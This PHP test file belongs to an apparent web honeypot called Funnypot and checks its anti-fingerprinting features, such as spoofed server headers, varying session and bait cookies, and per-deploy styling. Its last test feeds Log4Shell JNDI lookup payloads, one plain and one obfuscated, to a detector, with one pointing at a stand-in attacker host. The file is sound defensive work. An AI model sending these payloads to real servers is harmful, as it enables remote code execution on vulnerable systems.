<?php

declare(strict_types=1);

namespace Funnypot\Core\Tests;

use Funnypot\Core\Detection;
use Funnypot\Core\Honeytoken;
use Funnypot\Core\Log4ShellProbe;
use Funnypot\Core\RequestContext;
use Funnypot\Core\Response\RouteTemplateEmulator;
use Funnypot\Core\Response\RouteTemplateSet;
use Funnypot\Core\Response\Style;
use Funnypot\Core\Support\PersonaIdentity;
use Funnypot\Core\Support\VisualPersona;
use Funnypot\Core\Synthesis\ResponseSynthesizer;
use PHPUnit\Framework\TestCase;

final class AntiFingerprintTest extends TestCase
{
    // --- coherent server chrome ---

    public function test_server_and_powered_by_applied_to_every_response(): void
    {
        $synth = new ResponseSynthesizer(null, Style::MINIMAL, 'Apache/2.4.52 (Ubuntu)', 'PHP/8.1.27');
        $resp = $synth->synthesize(['bw' => ['MARK'], 's' => 200], $this->detection());

        self::assertNotNull($resp);
        self::assertSame('Apache/2.4.52 (Ubuntu)', $resp->headers['Server']);
        self::assertSame('PHP/8.1.27', $resp->headers['X-Powered-By']);
    }

    public function test_bundle_header_wins_over_chrome_default(): void
    {
        $synth = new ResponseSynthesizer(null, Style::MINIMAL, 'nginx', null);
        $resp = $synth->synthesize(['bw' => ['MARK'], 's' => 200, 'h' => ['Server' => 'Coyote']], $this->detection());

        self::assertNotNull($resp);
        self::assertSame('Coyote', $resp->headers['Server']);
    }

    // --- per-request session cookie ---

    public function test_login_template_sets_a_varying_session_cookie(): void
    {
        $set = RouteTemplateSet::fromFile(__DIR__ . '/../resources/compiled/funnypot-routes.php');
        $emu = new RouteTemplateEmulator($set);
        $bundle = ['bw' => ['Register For This Site'], 'pid' => 'wordpress-login', 't' => ['wordpress-login'], 's' => 200];

        $a = $emu->render($bundle, Style::REALISTIC, 1);
        $b = $emu->render($bundle, Style::REALISTIC, 2);

        self::assertNotNull($a);
        self::assertArrayHasKey('Set-Cookie', $a->headers);
        self::assertStringStartsWith('PHPSESSID=', $a->headers['Set-Cookie']);
        self::assertStringContainsString('HttpOnly', $a->headers['Set-Cookie']);
        self::assertNotSame($a->headers['Set-Cookie'], $b->headers['Set-Cookie']); // fresh per request
    }

    // --- honeytoken bait cookie ---

    public function test_honeytoken_replay_ok_but_tamper_detected(): void
    {
        $h = new Honeytoken('server-side-secret');
        $cookie = $h->cookie('sess', 'r=user');

        // Pull the value a browser would send back and confirm it verifies.
        $value = substr($cookie, strlen('sess='));
        $value = substr($value, 0, strpos($value, ';'));
        self::assertSame('ok', $h->inspect($value));

        // Absent = ordinary first visit.
        self::assertSame('absent', $h->inspect(null));

        // An attacker who escalates the role breaks the signature.
        $tampered = rawurlencode('r=admin.' . substr($value, strpos(rawurldecode($value), '.') + 1));
        self::assertSame('tampered', $h->inspect($tampered));
    }

    public function test_bait_envelope_varies_across_deploys_but_is_stable_within_one(): void
    {
        // FP-0282: the site-wide bait cookie envelope (name/payload/attributes) is per-deploy — no longer
        // the fleet constant `sess=r%3Duser…; path=/; HttpOnly`.
        $h = new Honeytoken('server-side-secret');
        $seedA = PersonaIdentity::seedFromMaterial('fp-0276-sample-a');
        $seedB = PersonaIdentity::seedFromMaterial('fp-0276-sample-b');

        // Within one deploy, byte-identical every render.
        self::assertSame($h->bait($seedA), $h->bait($seedA));

        // Across two deploys, the two Set-Cookie envelopes differ (name and/or payload and/or attrs).
        self::assertNotSame($h->bait($seedA), $h->bait($seedB), 'two deploys must not plant an identical bait envelope');
    }

    // --- FP-0283: seeded visual surface (class-prefix word + fg/muted) ---

    public function test_visual_skin_bytes_vary_across_deploys_but_are_stable_within_one(): void
    {
        // The seeded class-prefix WORD and the fg/muted palette bytes are per-deploy — no longer the
        // fleet constants `fp-` / #1b1e21 / #6b7280.
        $seedA = PersonaIdentity::seedFromMaterial('fp-0276-sample-a');
        $seedB = PersonaIdentity::seedFromMaterial('fp-0276-sample-b');

        $a = VisualPersona::fromSeed($seedA);
        $b = VisualPersona::fromSeed($seedB);

        // Within one deploy, byte-identical every render.
        self::assertSame($a->classPrefix(), VisualPersona::fromSeed($seedA)->classPrefix());
        self::assertSame($a->palette(), VisualPersona::fromSeed($seedA)->palette());

        // Across two deploys, the class prefix and both seeded text colours differ.
        self::assertNotSame($a->classPrefix(), $b->classPrefix(), 'two deploys must not share one class prefix');
        self::assertNotSame($a->palette()['fg'], $b->palette()['fg'], 'two deploys must not share one fg');
        self::assertNotSame($a->palette()['muted'], $b->palette()['muted'], 'two deploys must not share one muted');
    }

    public function test_no_fp_class_prefix_literal_in_src(): void
    {
        // A code lint so the funnypot-signature `fp-` class prefix cannot come back in any skin/helper:
        // no quoted or selector-form `fp-` literal (incl. the old `'fp-' .` concatenations) and no bare
        // `fp-XXXX` hex survives in src/. Backtick-quoted prose (`fp-`) in docblocks is not matched.
        $offenders = [];
        $it = new \RecursiveIteratorIterator(new \RecursiveDirectoryIterator(dirname(__DIR__) . '/src', \FilesystemIterator::SKIP_DOTS));
        foreach ($it as $file) {
            if ($file->getExtension() !== 'php') {
                continue;
            }
            $src = (string) file_get_contents($file->getPathname());
            if (preg_match('~[\'"\.]fp-~', $src) === 1 || preg_match('~\bfp-[0-9a-f]{4}\b~', $src) === 1) {
                $offenders[] = $file->getPathname();
            }
        }
        self::assertSame([], $offenders, 'legacy fp- class-prefix literal(s) in src/: ' . implode(', ', $offenders));
    }

    // --- Log4Shell / JNDI probe detection ---

    public function test_log4shell_probe_detected_in_headers(): void
    {
        $hit = new RequestContext('GET', '/', '', ['User-Agent' => '${jndi:ldap://evil.example/a}']);
        self::assertTrue(Log4ShellProbe::present($hit));

        $obfuscated = new RequestContext('GET', '/', '', ['X-Api-Version' => '${${lower:j}ndi:dns://x/y}']);
        self::assertTrue(Log4ShellProbe::present($obfuscated));

        $benign = new RequestContext('GET', '/', 'q=hello', ['User-Agent' => 'curl/8.0']);
        self::assertFalse(Log4ShellProbe::present($benign));
    }

    private function detection(): Detection
    {
        return new Detection(true, [], 'x', 'info');
    }
}
